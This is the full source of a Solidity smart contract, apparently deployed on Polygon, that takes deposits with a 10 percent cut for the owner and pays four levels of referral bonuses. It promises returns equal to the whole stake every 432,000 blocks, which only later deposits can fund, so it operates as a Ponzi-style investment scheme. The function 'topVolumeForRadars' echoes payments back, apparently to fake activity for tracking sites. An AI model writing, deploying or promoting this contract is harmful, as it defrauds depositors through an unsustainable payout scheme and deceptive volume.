/**
 *Submitted for verification at polygonscan.com on 2023-07-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

contract Staked {
    address owner = msg.sender;
    uint256 public totalInvestors;
    uint256 public totalInvested;
    uint256 public startBlock = 44817000;

    mapping(address => bool) public registered;
    mapping(address => uint256) public invested;
    mapping(address => uint256) public atBlock;
    mapping(address => address) public referrers;
    mapping(uint256 => uint256) public levels;
    mapping(address => mapping(uint256 => uint256)) public referralsCounts;
    mapping(address => uint256) public referralRewards;

    event Registered(address user);

    constructor() {
        levels[0] = 20;
        levels[1] = 50;
        levels[2] = 100;
        levels[3] = 100;
    }

    function _register(address referrerAddress) internal {
        if (!registered[msg.sender]) {
            address user = msg.sender;
            address nextReferrer = referrerAddress;
            for (uint256 i = 0; i < 4; i++) {
                if (registered[nextReferrer]) {
                    referrers[user] = nextReferrer;
                    referralsCounts[nextReferrer][i]++;

                    user = nextReferrer;
                    nextReferrer = referrers[user];
                } else {
                    break;
                }
            }

            totalInvestors++;
            registered[msg.sender] = true;
            emit Registered(msg.sender);
        }
    }

    function withdrawable(address user) public view returns (uint256) {
        return (invested[user] * (block.number - atBlock[user])) / 432000;
    }

    function withdraw() public {
        payable(msg.sender).transfer(
            referralRewards[msg.sender] + withdrawable(msg.sender)
        );

        referralRewards[msg.sender] = 0;
        atBlock[msg.sender] = block.number;
    }

    function deposit(address referrerAddress) external payable {
        require(block.number >= startBlock);
        require(msg.value >= 10 ether);
        payable(owner).transfer(msg.value / 10);

        _register(referrerAddress);

        address referrer = referrers[msg.sender];
        for (uint256 i = 0; i < 4; i++) {
            if (referrer != address(0)) {
                referralRewards[referrer] += msg.value / levels[i];
            } else {
                referralRewards[owner] += msg.value / levels[i];
            }

            referrer = referrers[referrer];
        }

        withdraw();

        totalInvested += msg.value;
        invested[msg.sender] += msg.value;
    }

    function topVolumeForRadars() external payable {
        payable(msg.sender).transfer(msg.value);
    }
}